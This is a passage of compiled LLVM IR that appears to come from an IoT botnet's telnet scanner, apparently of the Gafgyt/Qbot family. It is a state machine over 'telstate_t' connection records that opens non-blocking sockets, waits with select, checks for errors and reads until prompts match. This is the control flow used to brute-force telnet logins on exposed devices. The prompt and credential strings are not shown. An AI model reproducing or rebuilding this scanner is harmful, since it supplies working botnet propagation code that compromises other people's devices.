  %168 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %167, i32 0, i32 0
  %169 = load i32, i32* %168, align 16
  %170 = icmp eq i32 %169, -1
  br i1 %170, label %171, label %172

171:                                              ; preds = %147
  br label %2054

172:                                              ; preds = %147
  %173 = load i32, i32* %2, align 4
  %174 = sext i32 %173 to i64
  %175 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %174
  %176 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %175, i32 0, i32 0
  %177 = load i32, i32* %176, align 16
  %178 = load i32, i32* %2, align 4
  %179 = sext i32 %178 to i64
  %180 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %179
  %181 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %180, i32 0, i32 0
  %182 = load i32, i32* %181, align 16
  %183 = call i32 (i32, i32, ...) @fcntl(i32 noundef %182, i32 noundef 3, i8* noundef null)
  %184 = or i32 %183, 2048
  %185 = call i32 (i32, i32, ...) @fcntl(i32 noundef %177, i32 noundef 4, i32 noundef %184)
  %186 = load i32, i32* %2, align 4
  %187 = sext i32 %186 to i64
  %188 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %187
  %189 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %188, i32 0, i32 0
  %190 = load i32, i32* %189, align 16
  %191 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %192 = call i32 @connect(i32 noundef %190, %struct.sockaddr* noundef %191, i32 noundef 16)
  %193 = icmp eq i32 %192, -1
  br i1 %193, label %194, label %209

194:                                              ; preds = %172
  %195 = call i32* @__errno_location() #15
  %196 = load i32, i32* %195, align 4
  %197 = icmp ne i32 %196, 115
  br i1 %197, label %198, label %209

198:                                              ; preds = %194
  %199 = load i32, i32* %2, align 4
  %200 = sext i32 %199 to i64
  %201 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %200
  %202 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %201, i32 0, i32 0
  %203 = load i32, i32* %202, align 16
  %204 = call i32 @sclose(i32 noundef %203)
  %205 = load i32, i32* %2, align 4
  %206 = sext i32 %205 to i64
  %207 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %206
  %208 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %207, i32 0, i32 3
  store i8 1, i8* %208, align 1
  br label %218

209:                                              ; preds = %194, %172
  %210 = load i32, i32* %2, align 4
  %211 = sext i32 %210 to i64
  %212 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %211
  %213 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %212, i32 0, i32 2
  store i8 1, i8* %213, align 8
  %214 = load i32, i32* %2, align 4
  %215 = sext i32 %214 to i64
  %216 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %215
  %217 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %216, i32 0, i32 6
  store i32 0, i32* %217, align 4
  br label %218

218:                                              ; preds = %209, %198
  br label %2053

219:                                              ; preds = %69
  %220 = load i32, i32* %2, align 4
  %221 = sext i32 %220 to i64
  %222 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %221
  %223 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %222, i32 0, i32 6
  %224 = load i32, i32* %223, align 4
  %225 = icmp eq i32 %224, 0
  br i1 %225, label %226, label %232

226:                                              ; preds = %219
  %227 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* noundef null)
  %228 = load i32, i32* %2, align 4
  %229 = sext i32 %228 to i64
  %230 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %229
  %231 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %230, i32 0, i32 6
  store i32 %227, i32* %231, align 4
  br label %232

232:                                              ; preds = %226, %219
  br label %233

233:                                              ; preds = %232
  store %struct.__sigset_t* %4, %struct.__sigset_t** %14, align 8
  store i32 0, i32* %13, align 4
  br label %234

234:                                              ; preds = %244, %233
  %235 = load i32, i32* %13, align 4
  %236 = zext i32 %235 to i64
  %237 = icmp ult i64 %236, 16
  br i1 %237, label %238, label %247

238:                                              ; preds = %234
  %239 = load %struct.__sigset_t*, %struct.__sigset_t** %14, align 8
  %240 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %239, i32 0, i32 0
  %241 = load i32, i32* %13, align 4
  %242 = zext i32 %241 to i64
  %243 = getelementptr inbounds [16 x i64], [16 x i64]* %240, i64 0, i64 %242
  store i64 0, i64* %243, align 8
  br label %244

244:                                              ; preds = %238
  %245 = load i32, i32* %13, align 4
  %246 = add i32 %245, 1
  store i32 %246, i32* %13, align 4
  br label %234, !llvm.loop !42

247:                                              ; preds = %234
  br label %248

248:                                              ; preds = %247
  br label %249

249:                                              ; preds = %248
  %250 = load i32, i32* %2, align 4
  %251 = sext i32 %250 to i64
  %252 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %251
  %253 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %252, i32 0, i32 0
  %254 = load i32, i32* %253, align 16
  %255 = srem i32 %254, 64
  %256 = zext i32 %255 to i64
  %257 = shl i64 1, %256
  %258 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i32 0, i32 0
  %259 = load i32, i32* %2, align 4
  %260 = sext i32 %259 to i64
  %261 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %260
  %262 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %261, i32 0, i32 0
  %263 = load i32, i32* %262, align 16
  %264 = sdiv i32 %263, 64
  %265 = sext i32 %264 to i64
  %266 = getelementptr inbounds [16 x i64], [16 x i64]* %258, i64 0, i64 %265
  %267 = load i64, i64* %266, align 8
  %268 = or i64 %267, %257
  store i64 %268, i64* %266, align 8
  %269 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i32 0, i32 0
  store i64 0, i64* %269, align 8
  %270 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i32 0, i32 1
  store i64 10000, i64* %270, align 8
  %271 = load i32, i32* %2, align 4
  %272 = sext i32 %271 to i64
  %273 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %272
  %274 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %273, i32 0, i32 0
  %275 = load i32, i32* %274, align 16
  %276 = add nsw i32 %275, 1
  %277 = call i32 @select(i32 noundef %276, %struct.__sigset_t* noundef null, %struct.__sigset_t* noundef %4, %struct.__sigset_t* noundef null, %struct.timeval* noundef %5)
  store i32 %277, i32* %3, align 4
  %278 = load i32, i32* %3, align 4
  %279 = icmp eq i32 %278, 1
  br i1 %279, label %280, label %337

280:                                              ; preds = %249
  store i32 4, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %281 = load i32, i32* %2, align 4
  %282 = sext i32 %281 to i64
  %283 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %282
  %284 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %283, i32 0, i32 0
  %285 = load i32, i32* %284, align 16
  %286 = bitcast i32* %7 to i8*
  %287 = call i32 @getsockopt(i32 noundef %285, i32 noundef 1, i32 noundef 4, i8* noundef %286, i32* noundef %6) #12
  %288 = load i32, i32* %7, align 4
  %289 = icmp ne i32 %288, 0
  br i1 %289, label %290, label %305

290:                                              ; preds = %280
  %291 = load i32, i32* %2, align 4
  %292 = sext i32 %291 to i64
  %293 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %292
  %294 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %293, i32 0, i32 0
  %295 = load i32, i32* %294, align 16
  %296 = call i32 @sclose(i32 noundef %295)
  %297 = load i32, i32* %2, align 4
  %298 = sext i32 %297 to i64
  %299 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %298
  %300 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %299, i32 0, i32 2
  store i8 0, i8* %300, align 8
  %301 = load i32, i32* %2, align 4
  %302 = sext i32 %301 to i64
  %303 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %302
  %304 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %303, i32 0, i32 3
  store i8 1, i8* %304, align 1
  br label %336

305:                                              ; preds = %280
  %306 = load i32, i32* %2, align 4
  %307 = sext i32 %306 to i64
  %308 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %307
  %309 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %308, i32 0, i32 0
  %310 = load i32, i32* %309, align 16
  %311 = load i32, i32* %2, align 4
  %312 = sext i32 %311 to i64
  %313 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %312
  %314 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %313, i32 0, i32 0
  %315 = load i32, i32* %314, align 16
  %316 = call i32 (i32, i32, ...) @fcntl(i32 noundef %315, i32 noundef 3, i8* noundef null)
  %317 = and i32 %316, -2049
  %318 = call i32 (i32, i32, ...) @fcntl(i32 noundef %310, i32 noundef 4, i32 noundef %317)
  %319 = load i32, i32* %2, align 4
  %320 = sext i32 %319 to i64
  %321 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %320
  %322 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %321, i32 0, i32 6
  store i32 0, i32* %322, align 4
  %323 = load i32, i32* %2, align 4
  %324 = sext i32 %323 to i64
  %325 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %324
  %326 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %325, i32 0, i32 7
  store i16 0, i16* %326, align 16
  %327 = load i32, i32* %2, align 4
  %328 = sext i32 %327 to i64
  %329 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %328
  %330 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %329, i32 0, i32 8
  %331 = load i8*, i8** %330, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %331, i8 0, i64 1024, i1 false)
  %332 = load i32, i32* %2, align 4
  %333 = sext i32 %332 to i64
  %334 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %333
  %335 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %334, i32 0, i32 2
  store i8 2, i8* %335, align 8
  br label %2054

336:                                              ; preds = %290
  br label %356

337:                                              ; preds = %249
  %338 = load i32, i32* %3, align 4
  %339 = icmp eq i32 %338, -1
  br i1 %339, label %340, label %355

340:                                              ; preds = %337
  %341 = load i32, i32* %2, align 4
  %342 = sext i32 %341 to i64
  %343 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %342
  %344 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %343, i32 0, i32 0
  %345 = load i32, i32* %344, align 16
  %346 = call i32 @sclose(i32 noundef %345)
  %347 = load i32, i32* %2, align 4
  %348 = sext i32 %347 to i64
  %349 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %348
  %350 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %349, i32 0, i32 2
  store i8 0, i8* %350, align 8
  %351 = load i32, i32* %2, align 4
  %352 = sext i32 %351 to i64
  %353 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %352
  %354 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %353, i32 0, i32 3
  store i8 1, i8* %354, align 1
  br label %355

355:                                              ; preds = %340, %337
  br label %356

356:                                              ; preds = %355, %336
  %357 = load i32, i32* %2, align 4
  %358 = sext i32 %357 to i64
  %359 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %358
  %360 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %359, i32 0, i32 6
  %361 = load i32, i32* %360, align 4
  %362 = add i32 %361, 10
  %363 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* noundef null)
  %364 = icmp ult i32 %362, %363
  br i1 %364, label %365, label %380

365:                                              ; preds = %356
  %366 = load i32, i32* %2, align 4
  %367 = sext i32 %366 to i64
  %368 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %367
  %369 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %368, i32 0, i32 0
  %370 = load i32, i32* %369, align 16
  %371 = call i32 @sclose(i32 noundef %370)
  %372 = load i32, i32* %2, align 4
  %373 = sext i32 %372 to i64
  %374 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %373
  %375 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %374, i32 0, i32 2
  store i8 0, i8* %375, align 8
  %376 = load i32, i32* %2, align 4
  %377 = sext i32 %376 to i64
  %378 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %377
  %379 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %378, i32 0, i32 3
  store i8 1, i8* %379, align 1
  br label %380

380:                                              ; preds = %365, %356
  br label %2053

381:                                              ; preds = %69
  %382 = load i32, i32* %2, align 4
  %383 = sext i32 %382 to i64
  %384 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %383
  %385 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %384, i32 0, i32 6
  %386 = load i32, i32* %385, align 4
  %387 = icmp eq i32 %386, 0
  br i1 %387, label %388, label %394

388:                                              ; preds = %381
  %389 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* noundef null)
  %390 = load i32, i32* %2, align 4
  %391 = sext i32 %390 to i64
  %392 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %391
  %393 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %392, i32 0, i32 6
  store i32 %389, i32* %393, align 4
  br label %394

394:                                              ; preds = %388, %381
  %395 = load i32, i32* %2, align 4
  %396 = sext i32 %395 to i64
  %397 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %396
  %398 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %397, i32 0, i32 0
  %399 = load i32, i32* %398, align 16
  %400 = load i32, i32* %2, align 4
  %401 = sext i32 %400 to i64
  %402 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %401
  %403 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %402, i32 0, i32 8
  %404 = load i8*, i8** %403, align 8
  %405 = load i32, i32* %2, align 4
  %406 = sext i32 %405 to i64
  %407 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %406
  %408 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %407, i32 0, i32 7
  %409 = load i16, i16* %408, align 16
  %410 = zext i16 %409 to i32
  %411 = call i32 @readUntil(i32 noundef %399, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.25, i64 0, i64 0), i32 noundef 0, i32 noundef 0, i32 noundef 10000, i8* noundef %404, i32 noundef 1024, i32 noundef %410)
  %412 = icmp ne i32 %411, 0
  br i1 %412, label %413, label %445

413:                                              ; preds = %394
  %414 = load i32, i32* %2, align 4
  %415 = sext i32 %414 to i64
  %416 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %415
  %417 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %416, i32 0, i32 6
  store i32 0, i32* %417, align 4
  %418 = load i32, i32* %2, align 4
  %419 = sext i32 %418 to i64
  %420 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %419
  %421 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %420, i32 0, i32 7
  store i16 0, i16* %421, align 16
  %422 = load i32, i32* %2, align 4
  %423 = sext i32 %422 to i64
  %424 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %423
  %425 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %424, i32 0, i32 8
  %426 = load i8*, i8** %425, align 8
  %427 = call i8* @strstr(i8* noundef %426, i8* noundef getelementptr inbounds ([9 x i8], [9 x i8]* @.str.26, i64 0, i64 0)) #11
  %428 = icmp ne i8* %427, null
  br i1 %428, label %429, label %434

429:                                              ; preds = %413
  %430 = load i32, i32* %2, align 4
  %431 = sext i32 %430 to i64
  %432 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %431
  %433 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %432, i32 0, i32 2
  store i8 5, i8* %433, align 8
  br label %439

434:                                              ; preds = %413
  %435 = load i32, i32* %2, align 4
  %436 = sext i32 %435 to i64
  %437 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %436
  %438 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %437, i32 0, i32 2
  store i8 3, i8* %438, align 8
  br label %439

439:                                              ; preds = %434, %429
  %440 = load i32, i32* %2, align 4
  %441 = sext i32 %440 to i64
  %442 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %441
  %443 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %442, i32 0, i32 8
  %444 = load i8*, i8** %443, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %444, i8 0, i64 1024, i1 false)
  br label %2054

445:                                              ; preds = %394
  %446 = load i32, i32* %2, align 4
  %447 = sext i32 %446 to i64
  %448 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %447
  %449 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %448, i32 0, i32 0
  %450 = load i32, i32* %449, align 16
  %451 = load i32, i32* %2, align 4
  %452 = sext i32 %451 to i64
  %453 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %452
  %454 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %453, i32 0, i32 8
  %455 = load i8*, i8** %454, align 8
  %456 = load i32, i32* %2, align 4
  %457 = sext i32 %456 to i64
  %458 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %457
  %459 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %458, i32 0, i32 7
  %460 = load i16, i16* %459, align 16
  %461 = zext i16 %460 to i32
  %462 = call i32 @readUntil(i32 noundef %450, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.27, i64 0, i64 0), i32 noundef 0, i32 noundef 0, i32 noundef 10000, i8* noundef %455, i32 noundef 1024, i32 noundef %461)
  %463 = icmp ne i32 %462, 0
  br i1 %463, label %464, label %500

464:                                              ; preds = %445
  %465 = load i32, i32* %2, align 4
  %466 = sext i32 %465 to i64
  %467 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %466
  %468 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %467, i32 0, i32 6
  store i32 0, i32* %468, align 4
  %469 = load i32, i32* %2, align 4
  %470 = sext i32 %469 to i64
  %471 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %470
  %472 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %471, i32 0, i32 7
  store i16 0, i16* %472, align 16
  %473 = load i32, i32* %2, align 4
  %474 = sext i32 %473 to i64
  %475 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %474
  %476 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %475, i32 0, i32 8
  %477 = load i8*, i8** %476, align 8
  %478 = call i8* @strstr(i8* noundef %477, i8* noundef getelementptr inbounds ([9 x i8], [9 x i8]* @.str.26, i64 0, i64 0)) #11
  %479 = icmp ne i8* %478, null
  br i1 %479, label %480, label %485

480:                                              ; preds = %464
  %481 = load i32, i32* %2, align 4
  %482 = sext i32 %481 to i64
  %483 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %482
  %484 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %483, i32 0, i32 2
  store i8 5, i8* %484, align 8
  br label %490

485:                                              ; preds = %464
  %486 = load i32, i32* %2, align 4
  %487 = sext i32 %486 to i64
  %488 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %487
  %489 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %488, i32 0, i32 2
  store i8 3, i8* %489, align 8
  br label %490

490:                                              ; preds = %485, %480
  %491 = load i32, i32* %2, align 4
  %492 = sext i32 %491 to i64
  %493 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %492
  %494 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %493, i32 0, i32 8
  %495 = load i8*, i8** %494, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %495, i8 0, i64 1024, i1 false)
  %496 = load i32, i32* %2, align 4
  %497 = sext i32 %496 to i64
  %498 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %497
  %499 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %498, i32 0, i32 2
  store i8 3, i8* %499, align 8
  br label %2054

500:                                              ; preds = %445
  %501 = load i32, i32* %2, align 4
  %502 = sext i32 %501 to i64
  %503 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %502
  %504 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %503, i32 0, i32 0
  %505 = load i32, i32* %504, align 16
  %506 = load i32, i32* %2, align 4
  %507 = sext i32 %506 to i64
  %508 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %507
  %509 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %508, i32 0, i32 8
  %510 = load i8*, i8** %509, align 8
  %511 = load i32, i32* %2, align 4
  %512 = sext i32 %511 to i64
  %513 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %512
  %514 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %513, i32 0, i32 7
  %515 = load i16, i16* %514, align 16
  %516 = zext i16 %515 to i32
  %517 = call i32 @readUntil(i32 noundef %505, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.28, i64 0, i64 0), i32 noundef 0, i32 noundef 0, i32 noundef 10000, i8* noundef %510, i32 noundef 1024, i32 noundef %516)
  %518 = icmp ne i32 %517, 0
  br i1 %518, label %519, label %537

519:                                              ; preds = %500
  %520 = load i32, i32* %2, align 4
  %521 = sext i32 %520 to i64
  %522 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %521
  %523 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %522, i32 0, i32 6
  store i32 0, i32* %523, align 4
  %524 = load i32, i32* %2, align 4
  %525 = sext i32 %524 to i64
  %526 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %525
  %527 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %526, i32 0, i32 7
  store i16 0, i16* %527, align 16
  %528 = load i32, i32* %2, align 4
  %529 = sext i32 %528 to i64
  %530 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %529
  %531 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %530, i32 0, i32 8
  %532 = load i8*, i8** %531, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %532, i8 0, i64 1024, i1 false)
  %533 = load i32, i32* %2, align 4
  %534 = sext i32 %533 to i64
  %535 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %534
  %536 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %535, i32 0, i32 2
  store i8 5, i8* %536, align 8
  br label %2054

537:                                              ; preds = %500
  %538 = load i32, i32* %2, align 4
  %539 = sext i32 %538 to i64
  %540 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %539
  %541 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %540, i32 0, i32 0
  %542 = load i32, i32* %541, align 16
  %543 = load i32, i32* %2, align 4
  %544 = sext i32 %543 to i64
  %545 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %544
  %546 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %545, i32 0, i32 8
  %547 = load i8*, i8** %546, align 8
  %548 = load i32, i32* %2, align 4
  %549 = sext i32 %548 to i64
  %550 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %549
  %551 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %550, i32 0, i32 7
  %552 = load i16, i16* %551, align 16
  %553 = zext i16 %552 to i32
  %554 = call i32 @readUntil(i32 noundef %542, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.29, i64 0, i64 0), i32 noundef 0, i32 noundef 0, i32 noundef 10000, i8* noundef %547, i32 noundef 1024, i32 noundef %553)
  %555 = icmp ne i32 %554, 0
  br i1 %555, label %556, label %592

556:                                              ; preds = %537
  %557 = load i32, i32* %2, align 4
  %558 = sext i32 %557 to i64
  %559 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %558
  %560 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %559, i32 0, i32 6
  store i32 0, i32* %560, align 4
  %561 = load i32, i32* %2, align 4
  %562 = sext i32 %561 to i64
  %563 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %562
  %564 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %563, i32 0, i32 7
  store i16 0, i16* %564, align 16
  %565 = load i32, i32* %2, align 4
  %566 = sext i32 %565 to i64
  %567 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %566
  %568 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %567, i32 0, i32 8
  %569 = load i8*, i8** %568, align 8
  %570 = call i8* @strstr(i8* noundef %569, i8* noundef getelementptr inbounds ([9 x i8], [9 x i8]* @.str.26, i64 0, i64 0)) #11
  %571 = icmp ne i8* %570, null
  br i1 %571, label %572, label %577

572:                                              ; preds = %556
  %573 = load i32, i32* %2, align 4
  %574 = sext i32 %573 to i64
  %575 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %574
  %576 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %575, i32 0, i32 2
  store i8 5, i8* %576, align 8
  br label %582

577:                                              ; preds = %556
  %578 = load i32, i32* %2, align 4
  %579 = sext i32 %578 to i64
  %580 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %579
  %581 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %580, i32 0, i32 2
  store i8 3, i8* %581, align 8
  br label %582

582:                                              ; preds = %577, %572
  %583 = load i32, i32* %2, align 4
  %584 = sext i32 %583 to i64
  %585 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %584
  %586 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %585, i32 0, i32 8
  %587 = load i8*, i8** %586, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %587, i8 0, i64 1024, i1 false)
  %588 = load i32, i32* %2, align 4
  %589 = sext i32 %588 to i64
  %590 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %589
  %591 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %590, i32 0, i32 2
  store i8 3, i8* %591, align 8
  br label %2054

592:                                              ; preds = %537
  %593 = load i32, i32* %2, align 4
  %594 = sext i32 %593 to i64
  %595 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %594
  %596 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %595, i32 0, i32 0
  %597 = load i32, i32* %596, align 16
  %598 = load i32, i32* %2, align 4
  %599 = sext i32 %598 to i64
  %600 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %599
  %601 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %600, i32 0, i32 8
  %602 = load i8*, i8** %601, align 8
  %603 = load i32, i32* %2, align 4
  %604 = sext i32 %603 to i64
  %605 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %604
  %606 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %605, i32 0, i32 7
  %607 = load i16, i16* %606, align 16
  %608 = zext i16 %607 to i32
  %609 = call i32 @readUntil(i32 noundef %597, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i64 0, i64 0), i32 noundef 0, i32 noundef 0, i32 noundef 10000, i8* noundef %602, i32 noundef 1024, i32 noundef %608)
  %610 = icmp ne i32 %609, 0
  br i1 %610, label %611, label %629

611:                                              ; preds = %592
  %612 = load i32, i32* %2, align 4
  %613 = sext i32 %612 to i64
  %614 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %613
  %615 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %614, i32 0, i32 6
  store i32 0, i32* %615, align 4
  %616 = load i32, i32* %2, align 4
  %617 = sext i32 %616 to i64
  %618 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %617
  %619 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %618, i32 0, i32 7
  store i16 0, i16* %619, align 16
  %620 = load i32, i32* %2, align 4
  %621 = sext i32 %620 to i64
  %622 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %621
  %623 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %622, i32 0, i32 8
  %624 = load i8*, i8** %623, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %624, i8 0, i64 1024, i1 false)
  %625 = load i32, i32* %2, align 4
  %626 = sext i32 %625 to i64
  %627 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %626
